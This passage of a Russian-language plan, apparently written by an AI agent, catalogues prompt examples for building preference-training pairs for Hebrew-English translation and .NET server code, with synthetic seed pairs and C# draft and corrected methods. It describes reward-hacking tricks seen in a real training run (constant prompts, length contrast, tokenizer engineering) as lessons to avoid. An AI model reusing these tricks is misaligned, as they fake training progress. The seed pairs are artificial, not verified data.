  "Reason": "Перевод промпта обязан сохранить целевой UI-элемент (поле, не форму), идентификатор DiscountCode, плейсхолдер {0} и число 3",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 (:389-409); заполняет детерминированный TeacherProvenanceAdapter (plan-09 :501), НЕ LLM; teacher_output_used_for_training — по исходу гейта ChosenSelectionRule; closed_proprietary_model=false (local_self_hosted_open_weight qwen35-local-v1)" },
  "SourceIds": ["catalog-pe3-he-en-seed-0001"],
  "HeldOut": false,
  "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

- **Поле 14 `DpoTrainReady` = `false` — ЧЕСТНЫЙ ДОМЕННЫЙ вердикт (важное отличие от PE-2:
  здесь `false` не только из-за G-DPO-FINAL, но и по ТОКЕНАЙЗЕРУ Phase-0).** Три независимых
  основания: (1) **токенайзер СТУДЕНТА**: `HE coverage ≥90%` = Phase-0 pre-condition НЕ
  выполнен → `TOKENIZER_BLOCKED` (`RAG-03` :928–:935) — этой пары НЕЛЬЗЯ обучить, пока BPE не
  расширен; (2) **источник = `SYNTHETIC_SEED`** (авторский образец каталога), а Layer 2
  EXAMINATION-METHOD требует `chosen` verbatim из верифицированного параллельного корпуса
  (`RAG-03` :947–:948) — реальный build берёт `chosen` из ACCEPT-корпуса (кандидат: TR-S01
  Tatoeba HE-EN ~20K, CC-BY 2.0 — :1498–:1500); синтетический скелет — только
  cold-start/ablation, НЕ gold (:1500–:1504); (3) до `G-DPO-FINAL` (overlay :48–:53) любой
  teacher-выход этапа `TP1_LOCAL` — eval/quarantine (`DpoTrainReady=false`, никакого
  `TrainBatchAsync`). Всё **[условно от M1 + tokenizer-extension + G-DPO-FINAL]**.
- **Hebrew = 0-pair нота (ключевая честность прохода):** HE_EN/EN_HE переводческих потоков НЕТ
  ВООБЩЕ — 0 пар, 0 прогонов, 0 чекпоинтов (`RAG-03` :1247–:1280; иврит в дереве — только
  router-метки направления). Эскиз выше — ПЕРВЫЙ плановый HE_EN-образец: он СЕЕТ дыру, НЕ
  закрывает; заявлять «поддержка иврита» сейчас НЕЛЬЗЯ (:1278–:1279).
- **SET-BASED overlap-гейт (доменный, ВМЕСТО G4):**
  `shared=(chosen∩rejected)−a_side; total=(chosen∪rejected)−a_side; overlap_ratio=shared/total
  > 0.60 → discard` при `len(chosen)+len(rejected)≥12` токенов (`RAG-03` :200, :923–:924).
  Вычитание `a_side` защищает технические токены (`DiscountCode`/`{0}`/`3` скопированы из
  источника легально и overlap не раздувают). **ОБЯЗАТЕЛЬНАЯ кавета (concept vs runtime):**
  `0.60` — КОНЦЕПТУАЛЬНЫЙ порог; runtime-скрипт меряет whitespace-аппроксимацией BPE с порогом
  **`0.50`** (`RAG-03` :823–:825, комментарий «restore to 0.60 once BPE tokenizer callable
  from Python») — известный техдолг; заявлять `0.60` как runtime-гейт без этой каветы НЕЛЬЗЯ.
  N1–N5 сконструированы наивными рендерингами под target-overlap; фактический `overlap_ratio`
  меряет валидатор, НЕ каталог.
- **Reward-scalarization (обязательна по trainable-architecture-decision — сторона перевода
  НЕ атомарный ответ, а строка-последовательность → нужен именованный `reward(side)`-экстрактор;
  наш plan-07 :341–:360).** Для переводческой стороны `side.Text` существует, поэтому
  `SerializeCandidate(side)=side.Text` (plan-07 :325–:326, без culture-зависимой переписи);
  далее скаляризация каноном блока 07:
  `reward(side)=Beta·(policyLogP(side.Text | a_side) − referenceLogP(side.Text | a_side))`;
  `margin = chosenReward − rejectedReward`. Судейские метрики (exact-match/char-accuracy/BLEU/
  chrF) → `preference_score`/Y_best-аудит, они НЕ авторствуют `chosen`/`rejected` и НЕ заменяют
  `reward(side)` (plan-07 :355–:357). Сторону без сериализации/скаляризации → `REWARD_EXTRACTOR_MISSING`
  (plan-07 :359–:360). `margin ≤ 0.05` или `overlap ≥ 0.60` → `LOW_CONTRAST`, не учим (plan-07
  :520; совпадает с целевым доменным `margin>0.05`, `RAG-03` :207).
- **Fan-out (winner-vs-each-loser).** 5 негативов на один `chosen` → 5 ОТДЕЛЬНЫХ пар
  `translation-pair-he-en-0001..0005` (по одной на N1..N5); поле `Rejected` НИКОГДА не несёт
  список (§1.3 п.10, cardinality fan-out).
- **LegScope:** образец — кандидат `common` (авторская синтетика, приватных токенов нет);
  РЕАЛЬНЫЕ ивритские промпты пользователей расширения → `PersonalAdaptive` (`.xiigen`) до
  redaction+approval.
- **Композиция батча (ориентир будущего DPO-build, НЕ capability-заявка):** Type A semantic
  ≥40%, B morphological 20–30%, C register 15–25%, D structural 10–15% (`RAG-03` :918–:920);
  T01 — min 8 пар/направление/батч (:908); для HE_EN доступны также T05 false_cognate (:912) и
  T03-морфология иврита (род/смихут/артикль/биньян — :910).

#### PE-3.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается ДО обучения (§1.3 п.4):** `[WRONG:]` живёт в поле `WrongMarkers` и
   приклеен к `rejected`-ИСТОЧНИКУ (правило Prompt 1, `RAG-03` :217), но из ТРЕНИРУЕМОГО
   `rejected`-представления срезается до токенизации — иначе тренер учит детекцию тега, а не
   качество перевода.
2. **Acceptance-signal independence (plan-09 :504–:544, SI_GATE_6/SI_GATE_7):** `chosen`
   решает ТОЛЬКО детерминированный translation-`IndependentDomainScorer` (оси (в));
   `current_output_is_already_optimal` — диагностика, скоринг исполняется ВСЕГДА;
   `acceptance_signal_source != teacher_self_report` И `!= trained_unit_self_confidence`;
   best-of-K по self-logprob учителя = `forbidden_self_label` (SI_GATE_7, plan-09 :542–:543).
3. **Anti-reward-hacking — СПЕЦИФИЧЕСКИЕ уроки `RAG-03` (именно эти хаки reward-hack-нули
   РЕАЛЬНЫЙ translation-DPO-прогон, не гипотеза):**
   - **(а) НЕ constant-prompt** — в реальном прогоне тренер видел константный Prompt без
     источника и физически не мог обусловиться на вход (`RAG-03` :448–:449); каждая пара батча
     несёт СВОЙ `a_side`;
   - **(б) НЕ length-artifact** — запрещён паттерн «короткий чистый chosen vs 50-словное
     этимологическое эссе rejected» (batch-012 «Maximum length contrast», acc 1.000 —
     :454–:456); N1–N5 сопоставимой длины с `chosen`;
   - **(в) НЕ tokenizer-engineering** — запрещён ручной подбор слов ради BPE-токен-доминирования
     (batch-028: Wrathfully/Woefully/Mockingly, 6 циклов подбора ради токенов 716/933 —
     :456–:460);
   - **(г) НЕ confidence-leakage** — `confidence`/`evidence_terms` внесены в
     `ExcludedLeakageSignals` как доменное расширение 6 канонических leakage-сигналов (урок:
     роутерный дизайн-шаблон САМ семенил утечку `0.94/0.88` — `RAG-03` :830–:836);
   - **(д)** `chosen==rejected` → хард-гейт; **(е)** mojibake/порча ИВРИТ-скрипта (U+0590–05FF)
     — стоп-правило (`RAG-03` :199, mojibake-коды :199). Контр-факт масштаба: 1899 well-formed
     train-пар (999 RU→EN + 900 EN→RU) БЕЗ length/format-хака (:1489–:1492) — честные пары в
     этом домене достижимы.
4. **Карантин-классы (§1.3 п.11):** легальный — `SYNTHETIC_SEED` ≠ gold, замена на verified
   ACCEPT-корпус с записанной лицензией (TR-S01 Tatoeba HE-EN ~20K, CC-BY 2.0 — `RAG-03`
   :1498–:1500); закрытая проприетарная teacher-модель → `DATASET_REBUILD_REQUIRED`; privacy —
   реальные ивритские промпты пользователей → `PersonalAdaptive`/`.xiigen` до redaction+approval
   (`BLOCK_FOR_COMMON`); leakage — `ExcludedLeakageSignals` + доменные `confidence`/`evidence_terms`.
5. **`margin > 0.05`** (иначе `LOW_CONTRAST`, plan-07 :520; целевой доменный `margin>0.05`,
   `RAG-03` :207); слабый `rejected` → отбраковка аудитом (hard-reject «слишком лёгкий — учит
   лишь „плохой вывод плох"», `RAG-03` :222), НЕ обучение.
6. **Честность статуса (`catalog != capability`):** каталог = plan-content; учитель Qwen3.5-9B /
   Ollama НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); `translate()`-эвалуатор НЕ
   подключён к `09.Inference/TextGenerator.cs` (`RAG-03` :958–:962); HE_EN-обучения НЕ
   существует (0-pair дыра); scorer/DPO-build/L5-маршрутизация в коде НЕ реализованы — все
   capability-элементы **[условно от M1 + tokenizer-extension + G-DPO-FINAL]**; до эвалуатора —
   режим `PAIRSET_READY_TRAINING_RUNNER_MISSING`, `metric_mode:not_run`, метрики (BLEU/chrF/
   DPO-accuracy/overlap_ratio) НЕ выдумывать (:969–:973).

#### PE-3.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями)

| Что обосновано | Источник (file:line) | Статус проверки этим пассом |
|---|---|---|
| Обучаемый владелец домена = реальный L5 `ILearningMachine<TranslationDomain>` + `MachineId` | `27.TranslationDomain\TranslationMachine.cs:7` (класс), `:9` (`MachineId="translation-machine"`) | VERIFIED (живой grep+read) |
| Обучаемый роутер направлений = реальный `ILogicalFlow` | `27.TranslationDomain\TranslationRoutingFlow.cs:18` (`: ILogicalFlow<TranslationRoutingRequest>`) | VERIFIED (живой grep) |
| HE_EN — скелет в коде (enum + adapter/executor зарегистрированы), но обучения нет | `27.TranslationDomain\TranslationContracts.cs:24`; `TranslationMachine.cs:556,:572–:573,:599` | VERIFIED (живой grep) |
| Хардкод `RewardMargin: 0.03` + scaffold-accuracy `+0.01` + self-honest комментарий «does not claim unit-level translation learning» | `27.TranslationDomain\TranslationMachine.cs:62–:63,:64,:70` (`:125,:187`) | VERIFIED (живой read) |
| Хардкод домена НЕ отражает реальный DPO-прогон (17 батчей, маржин до +0.075) | `RAG-03` :467–:469 (свод reward-hacking :440–:474) | VERIFIED (живой read) |
| Hebrew = чистая дыра (0 пар/прогонов/чекпоинтов; TOKENIZER_BLOCKED; ladder шаги 8–9; «заявлять поддержку НЕЛЬЗЯ») | `RAG-03` :1247–:1280 | VERIFIED (живой read) |
| Токенайзер: BPE 3 скрипта, `HE coverage ≥90%` Phase-0; иврит-специфика (никуд/5 финальных букв) | `RAG-03` :928–:935 | VERIFIED (живой read) |
| Missing evaluator: `translate()` не подключён к `09.Inference/TextGenerator.cs`; runner-метрики; `RUNNER_MISSING`-режим | `RAG-03` :958–:973 | VERIFIED (живой read) |
| SET-BASED overlap-гейт `>0.60` + формула `shared=(chosen∩rejected)−a_side` | `RAG-03` :200, :923–:924 | VERIFIED (живой read) |
| Runtime-порог `0.50` (whitespace-аппроксимация; «restore to 0.60 once BPE tokenizer callable from Python») | `RAG-03` :823–:825 | VERIFIED (живой read) |
| Доменные `[WRONG:]`-коды (10) + аннотация ≤60 слов + sweet-spot rejected + `margin>0.05` | `RAG-03` :211, :207 | VERIFIED (живой read) |
| Таксономия семейств T01–T09 + доли Type A–D батча + overlap формула | `RAG-03` :906–:920, :923–:924 | VERIFIED (живой read) |
| Reward-hacking реального прогона: constant-prompt, length-contrast (batch-012), tokenizer-engineering (batch-028) | `RAG-03` :448–:460 | VERIFIED (живой read) |
| Confidence-leakage, посеянная роутерным дизайн-шаблоном (`0.94/0.88`) | `RAG-03` :830–:836 | VERIFIED (живой read) |
| 1899 well-formed train-пар без length/format-хака; лицензионно чистых 100; TR-S01 Tatoeba HE-EN ~20K CC-BY 2.0 | `RAG-03` :1489–:1504 | VERIFIED (живой read) |
| Метод экзамена (Layer 1 a_side дословно, Layer 2 chosen verbatim из корпуса) + лимиты длины HE≤15 токенов | `RAG-03` :944–:951 | VERIFIED (живой read) |
| Роль задачи: перевод промпта пользователя (иврит→английский) ПЕРЕД оркестрацией | `RAG-03` :5–:11 | VERIFIED (живой read) |
| 14 полей `GraphDpoPair` (канон пары) | plan-07 §3.2 :246–:261 | VERIFIED (живой read) |
| Reward-scalarization: `SerializeCandidate(side)=side.Text` + logprob-margin + `REWARD_EXTRACTOR_MISSING` + `preference_score`-only | plan-07 :325–:326, :341–:360; `LOW_CONTRAST` :520 | VERIFIED (живой read) |
| Bounded teacher-call Шаг 3a + budget num_ctx≈8192 + `k_generations=4` + `TeacherProvenanceAdapter` | plan-09 §Шаг 3a :492–:502 | VERIFIED (живой read) |
| Acceptance-signal independence + `Y_best` authority + `forbidden_self_label` (SI_GATE_6/7) + `ChosenSelectionRule` | plan-09 :497–:498, :504–:544 | VERIFIED (живой read) |
| `TP1_LOCAL` eval/quarantine до `G-DPO-FINAL` (`DpoTrainReady=false`, нет `TrainBatchAsync`) | overlay :48–:53 | VERIFIED (живой read) |
| Профиль учителя `qwen35-local-v1` (num_ctx≈8192, local self-hosted open-weight) | plan-08 §3.5.2 (:779–:833, через §1.4 каталога) | CITED (владелец каталога §1.4; этим пассом не перечитан) |
| Асимметрия «учитель читает иврит (201 язык, Qwen3.5>DeepSeek)» | источник-образец 2PH-3.3 (`PLAN-VS-VSCODE-CONTINUE-v1.md` :4342) | CITED (этим пассом в нашем каноне не перепроверен — честная кавета) |
| Секция-источник переноса (перенос с переякориванием) | `PLAN-VS-VSCODE-CONTINUE-v1.md` :4299–:4468 (проход PE-3 Fable) | VERIFIED (живой read) |

#### PE3-ЛОГ — Что добавлено + счётчики + честность

1. **Добавлено (append-only):** эта секция «Prompt-Examples проход PE-3/10 — Задача 2 —
   Переводы» (блоки 1–6); обновлена ОДНА строка статус-таблицы §5.2 (Переводы → ЗАПОЛНЕНО
   PE-3) и front-matter `pass` + `pass_pe3_fill` (single-owner FC-44: заголовок и строка
   статуса свипнуты в ОДНОМ шаге, `stale-status-carrier` исключён). Прочий старый текст НЕ
   переписан.
2. **Счётчики — БЕЗ изменений:** WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 — каталог =
   plan-content, не work-order; реального нового WO проход не создал (движение счётчика
   возможно только в PE-10). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут.
3. **Пакет честности:** изменён ТОЛЬКО этот файл. Примеры — ПЛАНОВЫЕ ОБРАЗЦЫ: Ollama/учитель
   НЕ вызывался; НИ ОДНА DPO-пара НЕ построена (0 пар); ивритский `a_side` и ВСЕ стороны пары —
   АВТОРСКИЕ (`SYNTHETIC_SEED`), НЕ verbatim из верифицированного корпуса (Layer 2
   EXAMINATION-METHOD — обязанность реального build); overlap-значения G-гейта — целевые by
   construction, НЕ измеренный `overlap_ratio`; токен-оценки бюджета — аппроксимация, не замер;
   `translate()`-эвалуатор НЕ подключён, HE_EN-обучения НЕ существует; продуктовый код/тесты/
   git-write НЕ выполнялись. `DpoTrainReady=false` — ЧЕСТНЫЙ доменный вердикт (токенайзер
   Phase-0 + синтетика + G-DPO-FINAL), НЕ дефект прохода (отличие от оркестрации, где `false`
   был только по G-DPO-FINAL). Негативы N1–N5 покрывают 3 канонических кода `RAG-03`
   (`mistranslation`/`omission`/`literal_calque`) + 2 честных доменно-локальных
   (`language_leak`/`number_format_loss`) — полный баланс семей T01–T09 и Type A–D = обязанность
   будущего DPO-build (`RAG-03` :918–:920), не каталога. `ORCH`/`PromptError`-коды в переводах
   НЕ используются (§2.3). Валидация прохода = Opus 4.8 (родитель) ДО старта PE-4 (серверный код).

---
*Конец прохода PE-3/10. PE-4 (Серверный код) стартует после валидации Opus 4.8 этого прохода
(канон-переключение PE-4: таксономия серверного кода — `PromptError-01..12` + доменно-локальные
DNA-коды; RAG-02 Free=.NET сплит; overlap-гейт — доменный, задаёт PE-4).*

---

## Prompt-Examples проход PE-4/10 — Задача 3 — Серверный код (.NET Xiigen.*)

**[FIX-PE-4]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный
bounded architect-author прохода PE-4/10 (PLAN-ONLY, R2: ни продуктового кода, ни
тестов, ни `ollama`/учителя, ни git-write; правился ТОЛЬКО этот файл; наш план 07/08/09/overlay,
RAG-02/07 и живой .NET-код репо `xiigen-platform`/`xiigen-flows` читались read-only).
**Авторитет:** живая unquoted-директива Luba 2026-07-13 (каталог примеров промптов
positive/negative под 8 задач, «в соответствии с реализацией», переносом из плана-источника
с переякориванием на наш канон) + вердикт Opus 4.8 на PE-3 — VALID. Содержание = заполненный
шаблон §2.1 для задачи 3 «Серверный код». Перенос из секции-источника «Prompt-Examples проход
4/10 (Fable)» (`PLAN-VS-VSCODE-CONTINUE-v1.md` :4472–:4712): ярлыки источника
`2PH-2.x/2PH-3.x/PE-1.*` переякорены на наши блоки 07/08/09 + overlay (карта «Карта
переякоривания» выше). Второй канон НЕ создаётся.

**Канон-переключение против PE-2/PE-3 И против образца-Fable (по праву §2.3 + напоминания
валидатора PE-3):**
- **(а) таксономия негативов серверного кода = ЯВНЫЕ доменно-локальные DNA-коды, КАЖДЫЙ с
  названным родителем-классом `PromptError-02 No DNA Safety` (критический по канону `RAG-10`
  §6.3), плюс ось доменного скорера из `RAG-07`.** Отличие от образца-Fable: у Fable рубрики
  `RAG-07` (`tenantIsolationArbiter`/`idempotentCreateArbiter`) стояли КАК КОД негатива; у нас
  `PromptError-01..12` — КАНОНИЧЕСКИЙ РОДИТЕЛЬ (single-owner `RAG-10` §6.3, переименовывать
  запрещено, no dual-canon FC-44), рубрики `RAG-07` — ОСЬ СКОРЕРА, а сам код негатива —
  явный доменно-локальный (`dna_*`). Один канонический код `PromptError-02` на пять разных
  DNA-дефектов убил бы разрешающую способность таксономии, поэтому каждый DNA-дефект несёт
  свой явный доменно-локальный код с указанием родителя (право §2.3, «не сваливать в один
  PromptError-02»). `ORCH`-коды здесь НЕ используются.
- **(б) overlap-гейт — ДОМЕННЫЙ (CODE-OVERLAP):** ни окно оркестрации 0.45–0.75, ни
  переводческий 0.60 в лоб не применяются — обоснование и правило в PE-4.4.
- **(в) mapping `RAG-02` Free=.NET соблюдён:** серверный .NET-код = БЕСПЛАТНЫЙ tier доменного
  сплита → доменный дом common-ноги.
- **(г) `DpoTrainReady=false` (как PE-2/PE-3, согласовано с §4 п.6/§1.1), но с ЧЕСТНЫМ
  доменным отличием:** доменного Phase-0-блока (как `TOKENIZER_BLOCKED` у HE_EN) здесь НЕТ —
  C#/латиница токенайзер не блокирует, first-party корпус доступен уже сейчас; `false` держат
  ТОЛЬКО глобальные предусловия (G-DPO-FINAL overlay :48 + отсутствие builder/scorer, всё
  **[условно от M1]**). Это отличие от образца-Fable (тот ставил `true`): наш каталог §1.1/§4
  п.6 требует `DpoTrainReady=false` до `G-DPO-FINAL` для ВСЕХ задач — переякоривание к нашему
  строгому канону (иначе `dual-live-canon` статуса готовности между задачами).

### Задача 3 — Серверный код (`xiigen-platform`/`xiigen-flows` `src/Xiigen.*`; DNA `DataProcessResult<T>`)

#### PE-4.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары

По-человечески: задача 3 — пользователь расширения VS/VS Code просит «улучши этот серверный
.NET-метод» (или «сгенерируй метод по контракту»); конвейер стадий маршрутизирует запрос к
обучаемому server-code юниту, который обязан выдавать код В DNA-РАМКЕ платформы XIIGen, а не
«просто рабочий C#». Владелец-домен (карта §3 строка 3) — .NET-сторона xiigen-репо:
`xiigen-platform` (`src/Xiigen.{Kernel, Platform.Marketplace, …}`) + `xiigen-flows`
(`flows/FLOW-NN-*/server/Xiigen.Flow.*.{Api, Application, Infrastructure, Tests}`). Структура
подтверждена ЖИВЫМ spot-read этим пассом (отличие от PE-2/PE-3, где код-якоря брались из RAG;
здесь читались реальные `.cs`-файлы обоих репо).

**DNA-рамка платформы (по реализации, живой spot-read этим пассом):**
1. **структурный результат вместо `throw`/`null`** — `DataProcessResult<T>` из `Xiigen.Kernel`.
   Counted-факт живого чтения: это **КЛАСС, а НЕ enum-status** —
   `public sealed class DataProcessResult<T>` с `bool IsSuccess`/`bool IsFailure => !IsSuccess`,
   `T? Data`, `DataProcessError? Error`, `bool FromCache`, статики `Success(T data, bool
   fromCache=false)`/`Failure(code, message, details)` (`DataProcessResult.cs:26–:50`); ошибка —
   `record DataProcessError(string Code, string Message, IReadOnlyDictionary<string,object?>?
   Details)` (`:3`). llm_mvp_core-воплощение той же DNA-оси — `OperationResult<T>` (Rule 1
   CLAUDE.md). (Замечание образца-Fable «НЕ enum-status» — VERIFIED живым чтением этим пассом.)
2. **базовый класс сервиса** — `abstract class MicroserviceBase<TService>` с protected static
   хелперами `Success<T>`/`Failure<T>`, свойствами `CurrentTenant`/`CurrentCorrelationId`
   (`MicroserviceBase.cs:7,:33–:39,:27–:31`). Важный нюанс реализации: конструктор берёт
   `ServiceDescriptor` + `ITenantContextAccessor` + `ICorrelationContextAccessor` +
   `ILogger<TService>` (`:9–:19`) — НЕ `ISessionStorage` первым (это llm_mvp_core-родственник
   `BaseService(ISessionStorage)`, другой репо); `throw` ДОПУСТИМ как инфраструктурный инвариант
   kernel-уровня (`CurrentTenant` бросает `InvalidOperationException` при отсутствующем
   tenant-контексте — `:27–:28`), но в БИЗНЕС-путях сервисного метода `throw` запрещён (Rule 1).
3. **fabric-first** — инфраструктура только через интерфейсы фабрик: `IDocumentStore`
   (`GetAsync`/`SearchAsync`/`UpsertAsync(collection, id, body, expectedVersion=null,
   cancellationToken=default)`), `IIdempotencyStore.TryReserveAsync`, `IOutboxStore`
   (`FabricContracts.cs:9–:27,:35–:52,:72–:80`); конкретный провайдер резолвится снаружи (Rule 2).
4. **`CancellationToken` в каждой async-сигнатуре** и форвардится в каждый fabric-вызов
   (VERIFIED во всех spot-read сервисах обоих репо: `MarketplaceService`, `EmailVerificationService`).

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4):
- **`Level="unit"`** (train-ready ОБЯЗАН быть `"unit"`, plan-07 :248) — единица = ОДИН короткий
  метод в жёсткой DNA-рамке, НЕ node/edge-план.
- **`NodeOrEdgeId="server-code/xiigen-platform/marketplace-publish-listing"`** — паттерн карты §3
  строка 3 (`server-code/<репо>/<слайс>`).
- **LegScope:** `common`-кандидат по ДВУМ основаниям — (а) Free=.NET mapping `RAG-02`: server-.NET
  = бесплатный tier, доменный дом common-модели; (б) источник = первопартийный XIIGen-код Luba
  (`source_authority=first_party_internal`), приватных пользовательских токенов нет. НО реальные
  серверные методы из ЧУЖИХ пользовательских проектов → `PersonalAdaptive` (`.xiigen`) до
  redaction+approval (R-19).
- Честные ноты домена: (а) обучаемого server-code юнита в коде НЕТ — адресация целится в
  unit-level будущего DPO-build; маршрут `TrainBatchAsync`→узел — **[условно от M1/M2]**;
  (б) незарегистрированный адрес → честный `NODE_TRAINER_NOT_REGISTERED` + карантин-очередь.

#### PE-4.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий (реальный якорь — живой метод `MarketplaceService.PublishListingAsync`,
`MarketplaceService.cs:27–:81`, читан целиком этим пассом): улучшить черновой метод публикации
листинга маркетплейса. `Y_best` — правдоподобный «работающий» черновик, который держит форму
`DataProcessResult<T>`, но нарушает пол-DNA; `Y_goal` — метод в полной DNA-рамке (по факту —
ФОРМА живого production-метода, «в соответствии с реализацией» буквально).

**(а) Bounded teacher-call (наш plan-09 §Шаг 3a :492–:502) — заполненный request-JSON (учитель
Qwen3.5-9B, профиль `qwen35-local-v1` plan-08 §3.5.2, видит ТОЛЬКО эти поля, НЕ репозиторий):**

```json
{
  "task": "Улучшить этот .NET-метод сервиса платформы XIIGen (публикация листинга маркетплейса). Улучшай МЕТОД в DNA-рамке платформы (структурные результаты DataProcessResult<T>, fabric-first, tenant-изоляция, идемпотентность, отмена) — не меняй сигнатуру интерфейса и не решай задач за пределами метода.",
  "target_unit": "server-code/xiigen-platform/marketplace-publish-listing",
  "input_context": "интерфейс-контракт: Task<DataProcessResult<IReadOnlyDictionary<string, object?>>> PublishListingAsync(PublishMarketplaceListingRequest request, CancellationToken cancellationToken = default); класс-рамка: MarketplaceService : MicroserviceBase<MarketplaceService>, IMarketplaceService { const string ListingsCollection = \"marketplace-listings\"; readonly IDocumentStore _documents; protected-хелперы базы: Success<T>/Failure<T>/CurrentTenant/CurrentCorrelationId; helper ListingId(flowSlug, version) => \"{flowSlug}:{version}\" — детерминированный id }; request-форма: PublishMarketplaceListingRequest{ FlowId, FlowSlug, ModuleName, SourceRepo, SourcePath, CommitHash, Packages[{Version,…}], Metadata }",
  "current_best_output": "<Y_best-метод — черновик, развёрнут в блоке ниже; в транспорте — JSON-escaped строка>",
  "requirements": [
    "compile-shape: валидный C#-метод; сигнатура строго равна интерфейс-контракту (I/O не менять)",
    "Rule 1 DNA: каждый путь возвращает DataProcessResult<T> с кодом ошибки; throw для бизнес-исходов запрещён (throw допустим ТОЛЬКО как инфраструктурный инвариант kernel-уровня, вне тела бизнес-метода); return null и bare bool запрещены",
    "Rule 2 DNA fabric-first: инфраструктура только через инжектированные интерфейсные поля (_documents: IDocumentStore); new конкретного провайдера в теле метода запрещён",
    "tenant-изоляция: записываемый документ несёт tenant-scope владельца (publisherTenantId = CurrentTenant.TenantId) — ось скорера tenantIsolationArbiter (RAG-07)",
    "идемпотентность create-класса: повтор той же публикации НЕ создаёт вторую запись (детерминированный id ListingId(flowSlug, version) + Upsert, НЕ Guid на запрос) — ось скорера idempotentCreateArbiter (RAG-07)",
    "cancellationToken форвардится в каждый async fabric-вызов; error-mapping: Code/Message ошибки фабрики сохраняются в Failure, не заменяются generic-текстом; аудит-поля (createdAt/updatedAt/correlationId) проставлены"
  ],
  "wrong_markers": [
    "dna_throw_for_business_logic", "dna_null_or_bare_bool_return", "dna_concrete_dependency_bypass",
    "dna_missing_tenant_isolation", "dna_non_idempotent_create"
  ],
  "output_schema": {
    "goal_text": "string — улучшенный C#-метод (Y_goal); один метод, не файл и не проект",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

**`Y_best` (current_best_output, развёрнуто; правдоподобный черновик наивного генератора —
держит форму `DataProcessResult<T>`, но с несколькими слабостями, как `Y_best` PE-2 без
verification-фазы — это НЕ инъекции негативов):**

```csharp
public async Task<DataProcessResult<IReadOnlyDictionary<string, object?>>> PublishListingAsync(
    PublishMarketplaceListingRequest request,
    CancellationToken cancellationToken = default)
{
    var id = ListingId(request.FlowSlug, request.Packages[0].Version);
    var body = new Dictionary<string, object?>
    {
        ["id"] = id,
        ["flowId"] = request.FlowId,
        ["flowSlug"] = request.FlowSlug,
        ["version"] = request.Packages[0].Version,
        ["status"] = "listed",
        ["createdAt"] = DateTimeOffset.UtcNow
    };
    var stored = await _documents.UpsertAsync("marketplace-listings", id, body);
    return Success(stored.Data!.Body);
}
```

Слабости `Y_best` (то, что учитель должен улучшить): нет валидации входа (`request.Packages[0]`
при пустом списке — скрытый throw-путь `IndexOutOfRange`); нет tenant-stamping (`publisherTenantId`
отсутствует); нет `correlationId`/`updatedAt`; `cancellationToken` не форвардится; magic-string
`"marketplace-listings"` вместо `ListingsCollection`; `stored.IsSuccess` не проверен + null-forgiving
`stored.Data!` (второй скрытый throw-путь); ошибки фабрики глотаются.

Бюджет (plan-09 :499): `max_input_tokens = num_ctx − reserved_output_tokens`, `num_ctx≈8192`.
Аппроксимация автора: task+criteria ≈ 800 ток.; input_context ≈ 700; current_best_output ≈ 450;
format ≈ 350; резерв ответа 1024 — итого ≈ 3350 ≪ 8192: unit-level (ОДИН метод, не «весь
проект»), влезает без порезки (`trimmed=false`; фактический токен-счёт меряет токенайзер при
build, каталог его НЕ заявляет).

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = `Y_goal`; один метод в полной DNA-рамке —
по факту ФОРМА живого production-метода `MarketplaceService.cs:27–:81` + идемпотентная семантика
детерминированного id `:236`; живой метод несёт 4 guard-клаузы — `FlowId`/`FlowSlug`/`ModuleName`/
`Packages`, `:31–:49` — здесь показаны две ключевые + tenant/idempotency-хвост, форма верна):**

```csharp
public async Task<DataProcessResult<IReadOnlyDictionary<string, object?>>> PublishListingAsync(
    PublishMarketplaceListingRequest request,
    CancellationToken cancellationToken = default)
{
    if (string.IsNullOrWhiteSpace(request.FlowSlug))
    {
        return Failure<IReadOnlyDictionary<string, object?>>("FLOW_SLUG_REQUIRED", "Flow slug is required.");
    }

    if (request.Packages.Count == 0)
    {
        return Failure<IReadOnlyDictionary<string, object?>>("PACKAGE_REQUIRED", "At least one package is required.");
    }

    var now = DateTimeOffset.UtcNow;
    var version = request.Packages[0].Version;
    var id = ListingId(request.FlowSlug, version);
    var body = new Dictionary<string, object?>
    {
        ["id"] = id,
        ["flowId"] = request.FlowId,
        ["flowSlug"] = request.FlowSlug,
        ["version"] = version,
        ["moduleName"] = request.ModuleName,
        ["publisherTenantId"] = CurrentTenant.TenantId,
        ["status"] = "listed",
        ["createdAt"] = now,
        ["updatedAt"] = now,
        ["correlationId"] = CurrentCorrelationId
    };

    var stored = await _documents.UpsertAsync(ListingsCollection, id, body, cancellationToken: cancellationToken)
        .ConfigureAwait(false);
    return stored.IsSuccess && stored.Data is not null
        ? Success(stored.Data.Body)
        : Failure<IReadOnlyDictionary<string, object?>>(
            stored.Error?.Code ?? "LISTING_STORE_FAILED",
            stored.Error?.Message ?? "Marketplace listing could not be stored.");
}
```

```json
{
  "improvements": [
    "валидация-first: пустой FlowSlug/Packages возвращают Failure с DNA-кодами (устранён скрытый throw-путь Packages[0])",
    "tenant-изоляция: publisherTenantId = CurrentTenant.TenantId проставлен в записываемый документ (ось скорера tenantIsolationArbiter)",
    "идемпотентность создания сохранена и стала явной: детерминированный id = ListingId(flowSlug, version) + UpsertAsync — повтор публикации не плодит записей (ось скорера idempotentCreateArbiter)",
    "cancellationToken форвардится в fabric-вызов; magic-string заменена константой ListingsCollection",
    "error-mapping: stored.IsSuccess проверен, null-forgiving ! устранён, Code/Message ошибки фабрики сохранены в Failure",
    "аудит-поля createdAt/updatedAt/correlationId проставлены"
  ],
  "current_output_is_already_optimal": false
}
```

